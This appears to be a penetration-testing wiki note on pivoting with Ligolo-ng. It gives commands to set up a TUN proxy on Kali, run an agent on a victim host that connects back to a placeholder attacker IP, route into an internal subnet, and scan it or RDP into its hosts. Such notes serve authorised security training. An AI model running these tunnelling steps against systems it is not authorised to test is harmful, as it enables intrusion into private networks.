# 🔀 Ligolo-ng

> Modern pivoting that gives you a **TUN interface** — you add a route to the internal subnet and your tools hit it **directly, no proxychains**. Cleaner and faster than SOCKS for scanning, GUI tools (RDP/Burp), and double pivots.

Part of [[Pivoting and Port Forwarding]]. Related: [[Chisel]] · [[SSH Tunneling]] · [[File Transfer]]

---

## 🧠 THINK
- Best when you want **native-speed** access without proxychains (GUI tools, big scans, UDP-friendlier).
- Kali runs the **proxy**; victim runs the **agent** (upload it → [[File Transfer]]); you add an `ip route` to the internal subnet.
- Match the **agent arch** to the victim.

## 💥 SETUP
Kali — create the TUN interface and start the proxy:
```bash
sudo ip tuntap add user $USER mode tun ligolo ; sudo ip link set ligolo up
```
```bash
./proxy -selfcert
```
Victim — run the agent (connects back):
```bash
./agent -connect YOURIP:11601 -ignore-cert
```
In the proxy console, select the session, then on Kali add the route to the internal subnet:
```bash
sudo ip route add 172.16.1.0/24 dev ligolo
```
Now hit the subnet directly:
```bash
nmap -sT 172.16.1.0/24
```
```bash
xfreerdp /u:user /p:pass /v:172.16.1.5
```

## 🔁 FOUND → NEXT
| SITUATION | NEXT |
|---|---|
| Want direct tool access | add `ip route` → use tools normally |
| GUI tool (RDP/Burp) | ligolo route (no proxychains) |
| Double pivot | agent-to-agent chaining (ligolo supports it) |
| Only a quick SOCKS needed | [[Chisel]] may be simpler |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Agent won't connect | wrong YOURIP (tun0)/blocked port; `-ignore-cert`; open 11601 or use 443 |
| No route to subnet | add `ip route ... dev ligolo`; confirm session is active in proxy |
| Wrong arch | upload matching agent build |
| Can't upload agent | use [[SSH Tunneling]] (creds) or [[Chisel]] |

## 📇 CHEAT SHEET
```bash
sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert
```
```bash
./agent -connect YOURIP:11601 -ignore-cert          # victim
```
```bash
sudo ip route add 172.16.1.0/24 dev ligolo          # then use tools directly
```
**Kill shot:** agent back to proxy → `ip route add ... dev ligolo` → tools hit the subnet natively.
